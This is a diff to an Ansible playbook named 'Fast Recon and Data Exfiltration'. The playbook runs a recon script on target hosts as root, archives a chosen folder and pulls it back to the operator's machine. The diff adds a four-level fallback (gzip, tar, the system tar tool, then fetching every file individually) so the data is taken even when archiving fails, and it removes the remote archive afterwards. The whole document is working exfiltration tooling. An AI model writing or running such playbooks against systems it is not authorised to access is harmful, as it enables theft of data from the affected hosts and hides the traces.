@@ -1,37 +1,76 @@
----
 - name: Fast Recon and Data Exfiltration
   hosts: "{{ target | default('my_servers') }}"
   become: yes
-#  gather_facts: no  # Set to 'no' for speed, 'yes' if script needs OS info
+  gather_facts: yes
   vars_files:
     - ../vars/settings.yml
 
   tasks:
     - name: 1. Run Recon Script
       ansible.builtin.script: "{{ remote_recon_script }}"
-      ignore_errors: yes # Don't stop if one host fails
+      ignore_errors: yes
 
     - name: 2. Check if source folder exists
       ansible.builtin.stat:
         path: "{{ source_folder }}"
       register: folder_check
 
-    - name: 3. Compress and Fetch (If folder exists)
+    - name: 3. Robust Exfiltration Block
+      when: folder_check.stat.exists
       block:
-        - name: Create Archive
+        # --- LEVEL 1: Ansible Native GZIP ---
+        - name: "Level 1: Attempt Ansible Archive (GZIP)"
           community.general.archive:
             path: "{{ source_folder }}"
             dest: "{{ temp_archive }}"
             format: gz
+          register: archive_lvl1
 
-        - name: Download Archive
+      rescue:
+        - name: "Level 2: Fallback to Ansible Archive (Plain TAR)"
+          community.general.archive:
+            path: "{{ source_folder }}"
+            dest: "{{ temp_archive }}"
+            format: tar
+          register: archive_lvl2
+          ignore_errors: yes
+
+        - name: "Level 3: Fallback to System TAR Tool"
+          ansible.builtin.shell: "tar -cf {{ temp_archive }} -C {{ source_folder | dirname }} {{ source_folder | basename }}"
+          when: archive_lvl2 is failed
+          register: archive_lvl3
+          ignore_errors: yes
+
+        # --- LEVEL 4: Brute Force Fetch (If all compression fails) ---
+        - name: "Level 4: Brute Force - Find all files"
+          ansible.builtin.find:
+            paths: "{{ source_folder }}"
+            recurse: yes
+            file_type: file
+          when: archive_lvl3 is failed
+          register: found_files
+
+        - name: "Level 4: Brute Force - Fetch individual files"
+          ansible.builtin.fetch:
+            src: "{{ item.path }}"
+            dest: "{{ local_results_path }}/{{ inventory_hostname }}/raw_files/{{ item.path | relpath(source_folder) }}"
+            flat: yes
+          loop: "{{ found_files.files }}"
+          when: archive_lvl3 is failed and found_files.matched > 0
+
+      always:
+        - name: Download Archive (If any Level 1-3 succeeded)
           ansible.builtin.fetch:
             src: "{{ temp_archive }}"
-            dest: "{{ local_results_path }}/{{ inventory_hostname }}/zxc_bundle.tar.gz"
+            dest: "{{ local_results_path }}/{{ inventory_hostname }}/zxc_bundle.tar"
             flat: yes
+          # Only run if one of the first 3 levels created a file
+          when: 
+            - folder_check.stat.exists
+            - (archive_lvl1 is succeeded or archive_lvl2 is succeeded or archive_lvl3 is succeeded)
 
         - name: Cleanup Remote Archive
           ansible.builtin.file:
             path: "{{ temp_archive }}"
             state: absent
-      when: folder_check.stat.exists
+          when: folder_check.stat.exists
